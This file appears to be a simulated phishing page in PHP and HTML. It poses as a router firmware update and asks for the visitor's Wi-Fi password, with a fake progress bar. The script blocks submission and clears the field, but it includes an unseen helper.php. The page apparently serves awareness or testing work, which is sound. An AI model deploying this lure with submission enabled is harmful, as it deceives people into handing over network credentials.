<?php
// SIMULATION-ONLY: This page blocks submissions and never stores/transmits data.
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
  . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
require_once('helper.php'); // Included for realism; not used to store data in this demo.
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Router Firmware Update</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />
  <style>
    :root {
      --bg:#0b1220; --panel:#0f1a33; --text:#e7eefc; --muted:#9fb0d3;
      --accent:#3aa0ff; --border:rgba(255,255,255,0.08); --accent-soft:#5e9aff;
      --radius:12px; --shadow:0 10px 25px rgba(0,0,0,.35);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100%}
    body{
      background:radial-gradient(800px 400px at 20% 10%,#0e1a35, #0b1220 55%, #08101f 100%);
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial; 
      color:var(--text);
      display:flex; align-items:center; justify-content:center;
      padding:16px;
    }
    .wrap{width:100%; max-width:400px}
    .card{
      background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(255,255,255,.02));
      border:1px solid var(--border);
      border-radius:var(--radius);
      box-shadow:var(--shadow);
    }
    .hd{padding:16px; border-bottom:1px solid var(--border); text-align:center}
    .hd h1{font-size:17px;font-weight:600}
    .hd .sub{color:var(--muted); font-size:13px; margin-top:6px}
    .bd{padding:16px}
    label{display:block;font-size:14px;color:var(--muted);margin:12px 0 6px}
    input[type=password]{
      width:100%; padding:10px 12px; border-radius:8px; border:1px solid var(--border);
      background:rgba(255,255,255,.05); color:var(--text);
    }
    button{
      width:100%; margin-top:14px; border:none; border-radius:8px;
      background:linear-gradient(135deg,var(--accent),var(--accent-soft));
      color:#fff; font-weight:600; padding:11px 14px; cursor:pointer;
      box-shadow:0 6px 14px rgba(58,160,255,.35);
    }
    button[disabled]{opacity:.65; cursor:default}
    .kv{display:grid;grid-template-columns:1fr 1fr;gap:6px 10px;font-size:13px;margin-top:8px}
    .kv .k{color:var(--muted)}
    .progress{
      margin-top:16px; height:6px; border-radius:999px;
      background:rgba(255,255,255,.06);
      overflow:hidden; border:1px solid var(--border);
    }
    .bar{
      height:100%; width:0%;
      background:linear-gradient(90deg, rgba(94,154,255,.35), rgba(58,160,255,.7));
      transition:width .6s ease;
    }
    .eta{display:none; margin-top:10px; font-size:12px; color:var(--muted); text-align:center}
    .eta.on{display:block}
    .ft{padding:12px; border-top:1px solid var(--border); color:var(--muted); font-size:12px; text-align:center}
    noscript{color:#ffb4b4;font-size:14px;display:block;margin-top:8px;text-align:center}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="region" aria-labelledby="t">
      <div class="hd">
        <h1 id="t">Firmware Update</h1>
        <div class="sub">A security update is available. Confirmation required to proceed.</div>
      </div>

      <div class="bd">
        <div class="kv" aria-label="Firmware details">
          <div class="k">Current version</div><div>2.5.3</div>
          <div class="k">Available</div><div>2.5.9 (stable)</div>
          <div class="k">Release date</div><div>2025-07-22</div>
        </div>

        <form id="updateForm" method="post" action="#">
          <label for="pw">Wi-Fi Password</label>
          <input id="pw" name="password" type="password" placeholder="••••••••" required>

          <button type="submit" id="btn">Continue</button>

          <div class="progress" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0">
            <div class="bar" id="bar"></div>
          </div>

          <div class="eta" id="eta">Estimated time remaining: 05:00</div>
        </form>

        <noscript>JavaScript is required to continue.</noscript>
      </div>

      <div class="ft">
        Do not refresh or power off your router during the update.
      </div>
    </div>
  </div>

  <script>
    // Simulation only: block submission; never send/store anything.
    (function(){
      const form = document.getElementById('updateForm');
      const pw   = document.getElementById('pw');
      const btn  = document.getElementById('btn');
      const bar  = document.getElementById('bar');
      const eta  = document.getElementById('eta');
      const pb   = document.querySelector('.progress');
      const TOTAL = 300000; // 5 minutes

      function fmt(ms){
        const s = Math.max(0, Math.ceil(ms/1000));
        const m = Math.floor(s/60);
        const r = String(s % 60).padStart(2,'0');
        return `${String(m).padStart(2,'0')}:${r}`;
      }

      function easedProgress(t){
        const x = Math.min(1, t / TOTAL);
        return x < 0.5 ? 4*x*x*x : 1 - Math.pow(-2*x + 2, 3)/2;
      }

      function startProgress(){
        const start = performance.now();
        eta.classList.add('on');
        function tick(now){
          const elapsed = Math.min(TOTAL, now - start);
          const p = easedProgress(elapsed);
          const pct = (p * 100);
          bar.style.width = pct.toFixed(2) + '%';
          pb.setAttribute('aria-valuenow', pct.toFixed(1));
          eta.textContent = 'Estimated time remaining: ' + fmt(TOTAL - elapsed);
          if (elapsed < TOTAL){
            requestAnimationFrame(tick);
          } else {
            eta.textContent = 'Update completed. (simulation)';
            btn.disabled = false;
            btn.textContent = 'Reboot Router';
          }
        }
        requestAnimationFrame(tick);
      }

      form.addEventListener('submit', function(e){
        e.preventDefault();
        pw.value = '';
        btn.disabled = true;
        btn.textContent = 'Applying update…';
        startProgress();
      });
    })();
  </script>
</body>
</html>
